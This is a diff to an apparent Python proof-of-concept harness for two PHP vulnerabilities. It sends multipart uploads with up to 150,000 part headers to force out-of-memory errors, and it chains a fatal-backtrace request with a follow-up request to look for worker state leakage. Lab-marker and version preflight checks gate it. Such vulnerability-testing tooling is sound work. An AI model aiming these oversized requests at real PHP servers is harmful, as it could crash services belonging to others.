@@ -20,6 +20,50 @@ from urllib.parse import urlsplit
 
 BOUNDARY = "php-official-cve-lab"
 MAX_RESPONSE_BYTES = 2048
+
+
+def php_size_bytes(value):
+    """Return a PHP ini byte size, or None when the value is invalid/unlimited."""
+    if value is None:
+        return None
+    value = str(value).strip()
+    if not value or value in ("-1", "0"):
+        return None
+    multiplier = {"K": 1024, "M": 1024 ** 2, "G": 1024 ** 3}
+    try:
+        suffix = value[-1].upper()
+        size = int(value[:-1]) * multiplier[suffix] if suffix in multiplier else int(value)
+    except (TypeError, ValueError):
+        return None
+    return size if size > 0 else None
+
+
+def php_post_max_bytes(value):
+    """Parse post_max_size; only literal 0 denotes an unlimited POST size."""
+    if str(value).strip() == "0":
+        return None
+    size = php_size_bytes(value)
+    if size is None:
+        raise ValueError(f"invalid post_max_size: {value!r}")
+    return size
+
+
+def lab_health(result, expected_php, expected_sapi):
+    try:
+        data = json.loads(result.get("body_prefix", ""))
+    except (TypeError, ValueError):
+        return {}, "health endpoint did not return JSON"
+    if not isinstance(data, dict):
+        return {}, "health endpoint did not return a JSON object"
+    if result.get("http_status") != 200:
+        return data, "health endpoint returned non-200"
+    if data.get("lab") != "official-cve-lab-v1":
+        return data, "lab marker mismatch"
+    if data.get("php") != expected_php:
+        return data, "PHP version mismatch"
+    if data.get("sapi") != expected_sapi:
+        return data, "SAPI mismatch"
+    return data, None
 def parse_target(spec):
     try:
         parsed = urlsplit(spec)
@@ -112,6 +156,7 @@ def send(scheme, host, port, method, path, timeout, ca_file, request_id,
             "http_status": response.status,
             "reason": response.reason,
             "worker_pid_header": response.getheader("X-Lab-Worker-Pid"),
+            "lab_producer_header": response.getheader("X-Lab-Producer"),
             "server_header": response.getheader("Server"),
             "content_type": response.getheader("Content-Type"),
             "body_prefix": prefix.decode("utf-8", "replace"),
@@ -139,12 +184,12 @@ def persist(report_path, report, run_id):
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("mode", choices=("109618", "109619"))
-    parser.add_argument("--target", required=True, help="HTTP(S) lab URL")
-    parser.add_argument("--health", default="health.php")
+    parser.add_argument("--target", required=True, help="HTTP(S) URL of an authorized lab")
+    parser.add_argument("--health", help="Health path (109618 default: oom/health.php; 109619: health.php)")
     parser.add_argument("--producer", default="fatal-backtrace.php")
-    parser.add_argument("--consumer", default="health.php")
-    parser.add_argument("--upload", default="upload.php")
-    parser.add_argument("--part-headers", type=int, default=5000,
+    parser.add_argument("--consumer", default="early/health.php")
+    parser.add_argument("--upload", help="109618 upload path (default: oom/upload.php)")
+    parser.add_argument("--part-headers", type=int, default=150000,
                         help="109618 candidate multipart header count, 1..150000")
     parser.add_argument("--oom-strategy", choices=("part-headers", "empty-files", "form-value", "files-registration"),
                         default="part-headers")
@@ -167,23 +212,23 @@ def main():
     try:
         scheme, host, port, prefix = parse_target(args.target)
         paths = {
-            "health": endpoint_path(prefix, args.health),
+            "health": endpoint_path(prefix, args.health or ("oom/health.php" if args.mode == "109618" else "health.php")),
             "producer": endpoint_path(prefix, args.producer),
             "consumer": endpoint_path(prefix, args.consumer),
-            "upload": endpoint_path(prefix, args.upload),
+            "upload": endpoint_path(prefix, args.upload or ("oom/upload.php" if args.mode == "109618" else "upload.php")),
         }
     except ValueError as exc:
         parser.error(str(exc))
-    if args.part_headers < 1:
-        parser.error("--part-headers must be >= 1")
-    if args.empty_files < 1:
-        parser.error("--empty-files must be >= 1")
-    if args.field_bytes < 1:
-        parser.error("--field-bytes must be >= 1")
-    if args.pad_kib < 0:
-        parser.error("--pad-kib must be >= 0")
-    if args.field_name_kib < 1:
-        parser.error("--field-name-kib must be >= 1")
+    if not 1 <= args.part_headers <= 150000:
+        parser.error("--part-headers must be 1..150000")
+    if not 1 <= args.empty_files <= 10000:
+        parser.error("--empty-files must be 1..10000")
+    if not 1 <= args.field_bytes <= 7340032:
+        parser.error("--field-bytes must be 1..7340032")
+    if not 0 <= args.pad_kib <= 2048:
+        parser.error("--pad-kib must be 0..2048")
+    if not 1 <= args.field_name_kib <= 1024:
+        parser.error("--field-name-kib must be 1..1024")
     if not 0.5 <= args.timeout <= 60:
         parser.error("--timeout must be 0.5..60 seconds")
     if args.ca_file and not args.ca_file.is_file():
@@ -199,8 +244,6 @@ def main():
         "observed_at_utc": datetime.now(timezone.utc).isoformat(),
         "mode": args.mode,
         "target": args.target,
-        "expected_php": args.expected_php,
-        "expected_sapi": args.expected_sapi,
         "endpoints": paths,
         "executed": args.execute,
         "candidate_attempted": False,
@@ -245,16 +288,19 @@ def main():
         if args.execute:
             plan = [("baseline", "GET", paths["health"], None, None)]
             if args.mode == "109618":
+                plan.append(("upload_preflight", "GET", paths["upload"], None, None))
                 plan.append(("multipart_candidate", "POST", paths["upload"], body,
                              f"multipart/form-data; boundary={BOUNDARY}"))
                 plan.append(("after", "GET", paths["health"], None, None))
             else:
                 plan.extend([
-                    ("consumer_preflight", "GET", paths["consumer"], None, None),
+                    ("consumer_control", "GET", paths["consumer"], None, None),
                     ("fatal_producer", "GET", paths["producer"], None, None),
                     ("early_consumer", "GET", paths["consumer"], None, None),
                 ])
             for step_name, method, path, payload, content_type in plan:
+                if step_name == "multipart_candidate" and report.get("preflight_failure"):
+                    break
                 request_id = f"{run_id}-{step_name}"
                 report["in_flight_step"] = step_name
                 if step_name in ("multipart_candidate", "fatal_producer"):
@@ -269,56 +315,76 @@ def main():
                 if step_name in ("multipart_candidate", "fatal_producer"):
                     report["candidate_response_received"] = "http_status" in result
                 persist(report_path, report, run_id)
-                if step_name in ("baseline", "consumer_preflight"):
-                    try:
-                        health = json.loads(result.get("body_prefix", ""))
-                    except (json.JSONDecodeError, TypeError):
-                        health = {}
-                    if not isinstance(health, dict):
-                        health = {}
-                    observed = {
+                if step_name == "baseline":
+                    health, failure = lab_health(result, args.expected_php, args.expected_sapi)
+                    report["preflight"] = {
                         "lab_marker": health.get("lab"),
                         "php": health.get("php"),
                         "sapi": health.get("sapi"),
                         "memory_limit": health.get("memory_limit"),
+                        "post_max_size": health.get("post_max_size"),
                         "fatal_error_backtraces": health.get("fatal_error_backtraces"),
                         "auto_detect_line_endings": health.get("auto_detect_line_endings"),
                     }
-                    if step_name == "baseline":
-                        report["preflight"] = observed
-                    else:
-                        report["consumer_preflight"] = observed
-                    if result.get("http_status") != 200:
-                        report["stopped_reason"] = f"{step_name} endpoint returned non-200"
+                    if not failure and args.mode == "109618" and not php_size_bytes(health.get("memory_limit")):
+                        failure = "109618 requires a finite memory_limit for this lab probe"
+                    if not failure and args.mode == "109619" and str(health.get("fatal_error_backtraces")) not in ("1", "On"):
+                        failure = "fatal_error_backtraces is not enabled"
+                    if failure:
+                        report["preflight_failure"] = failure
                         break
-                    if (health.get("lab") != "official-cve-lab-v1" or
-                            health.get("php") != args.expected_php or
-                            health.get("sapi") != args.expected_sapi):
-                        report["stopped_reason"] = f"{step_name} lab/version/SAPI mismatch"
+                elif step_name == "upload_preflight":
+                    upload_health, failure = lab_health(result, args.expected_php, args.expected_sapi)
+                    report["upload_preflight"] = upload_health
+                    if not failure:
+                        if "post_max_size" not in upload_health:
+                            failure = "upload endpoint did not report post_max_size"
+                        try:
+                            post_max = php_post_max_bytes(upload_health.get("post_max_size"))
+                        except ValueError as exc:
+                            failure = str(exc)
+                            post_max = None
+                        if not failure and post_max is not None and len(body) >= post_max:
+                            failure = f"multipart body ({len(body)} bytes) reaches post_max_size ({post_max} bytes)"
+                    if failure:
+                        report["preflight_failure"] = failure
                         break
-                    if step_name == "baseline" and args.mode == "109619":
-                        if not str(health.get("php", "")).startswith("8.5."):
-                            report["stopped_reason"] = "109619 fatal-backtrace path requires PHP 8.5"
+                elif step_name == "consumer_control":
+                    consumer_health, failure = lab_health(result, args.expected_php, args.expected_sapi)
+                    report["consumer_preflight"] = consumer_health
+                    if not failure and str(consumer_health.get("auto_detect_line_endings")) not in ("1", "On"):
+                        failure = "early INI diagnostic not active in consumer directory"
+                    if failure:
+                        report["preflight_failure"] = failure
+                        break
+                elif step_name in ("multipart_candidate", "fatal_producer", "early_consumer"):
+                    report.setdefault("observations", {})[step_name] = {
+                        "oom_text_observed": "Allowed memory size" in result.get("body_prefix", ""),
+                        "transport_anomaly": "transport_error" in result,
+                    }
+                    if step_name == "fatal_producer":
+                        marker_ok = result.get("lab_producer_header") == "fatal-backtrace"
+                        fatal_ok = result.get("http_status") == 500
+                        report["observations"][step_name]["producer_marker_observed"] = marker_ok
+                        report["observations"][step_name]["http_fatal_observed"] = fatal_ok
+                        if not (marker_ok and fatal_ok):
+                            report["stopped_reason"] = "fatal producer marker/HTTP 500 not observed"
                             break
-                        if str(health.get("fatal_error_backtraces", "")).lower() not in ("1", "on"):
-                            report["stopped_reason"] = "fatal_error_backtraces is not enabled"
-                            break
-                        if paths["consumer"] == paths["health"]:
-                            report["stopped_reason"] = "109619 requires a separate early consumer endpoint"
-                            break
-                    if (step_name == "consumer_preflight" and
-                            str(health.get("auto_detect_line_endings", "")).lower() not in ("1", "on")):
-                        report["stopped_reason"] = "early consumer INI setting is not enabled"
-                        break
-                if step_name == "fatal_producer":
-                    body_text = result.get("body_prefix", "") or ""
-                    observed_fatal = (result.get("http_status", 0) >= 500 or
-                                      "CVE_LAB_BACKTRACE_FATAL" in body_text)
-                    report["fatal_producer_observed"] = observed_fatal
-                    if not observed_fatal:
-                        report["stopped_reason"] = "fatal producer outcome not observed; consumer not sent"
-                        persist(report_path, report, run_id)
-                        break
+                    elif step_name == "early_consumer":
+                        producer_pid = report["steps"][-2]["result"].get("worker_pid_header")
+                        consumer_pid = result.get("worker_pid_header")
+                        report["observations"][step_name]["same_worker_observed"] = (
+                            producer_pid == consumer_pid if producer_pid and consumer_pid else None)
+                elif step_name == "after" and args.mode == "109618":
+                    baseline_pid = report["steps"][0]["result"].get("worker_pid_header")
+                    after_pid = result.get("worker_pid_header")
+                    report.setdefault("observations", {})["after"] = {
+                        "health_ok": result.get("http_status") == 200,
+                        "baseline_worker_pid": baseline_pid,
+                        "after_worker_pid": after_pid,
+                        "worker_pid_changed": (baseline_pid != after_pid
+                                               if baseline_pid and after_pid else None),
+                    }
     except KeyboardInterrupt:
         report["interrupted"] = True
     except Exception as exc:
